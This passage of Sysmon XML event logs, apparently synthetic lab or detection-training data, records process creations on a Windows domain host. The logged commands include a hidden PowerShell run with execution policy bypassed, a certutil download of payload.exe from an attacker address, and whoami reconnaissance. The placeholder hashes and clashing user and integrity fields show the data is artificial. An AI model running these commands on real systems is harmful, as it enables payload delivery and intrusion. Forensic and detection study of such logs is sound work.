      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:52.0000000Z" />
      <EventRecordID>5080</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:52.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0076-000000000c00}</Data>
      <Data Name="ProcessId">6076</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000004C0000004C0000004C0000004C0000004C,MD5=0000004C0000004C0000004C0000004C,SHA256=0000004C0000004C0000004C0000004C0000004C0000004C0000004C0000004C,IMPHASH=0000004C0000004C0000004C0000004C</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0076-000000000c00}</Data>
      <Data Name="ParentProcessId">5076</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:59.0000000Z" />
      <EventRecordID>5081</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:59.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0077-000000000c00}</Data>
      <Data Name="ProcessId">6077</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000004D0000004D0000004D0000004D0000004D,MD5=0000004D0000004D0000004D0000004D,SHA256=0000004D0000004D0000004D0000004D0000004D0000004D0000004D0000004D,IMPHASH=0000004D0000004D0000004D0000004D</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0077-000000000c00}</Data>
      <Data Name="ParentProcessId">5077</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:09:06.0000000Z" />
      <EventRecordID>5082</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:09:06.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0078-000000000c00}</Data>
      <Data Name="ProcessId">6078</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000004E0000004E0000004E0000004E0000004E,MD5=0000004E0000004E0000004E0000004E,SHA256=0000004E0000004E0000004E0000004E0000004E0000004E0000004E0000004E,IMPHASH=0000004E0000004E0000004E0000004E</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0078-000000000c00}</Data>
      <Data Name="ParentProcessId">5078</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:09:13.0000000Z" />
      <EventRecordID>5083</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:09:13.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0079-000000000c00}</Data>
      <Data Name="ProcessId">6079</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000004F0000004F0000004F0000004F0000004F,MD5=0000004F0000004F0000004F0000004F,SHA256=0000004F0000004F0000004F0000004F0000004F0000004F0000004F0000004F,IMPHASH=0000004F0000004F0000004F0000004F</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0079-000000000c00}</Data>
      <Data Name="ParentProcessId">5079</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:09:14.0000000Z" />
      <EventRecordID>5085</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:09:14.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0079-000000000c00}</Data>
      <Data Name="ProcessId">6079</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="DestinationIp">10.10.14.5</Data>
      <Data Name="DestinationPort">443</Data>
    </EventData>
  </Event>
</Events>
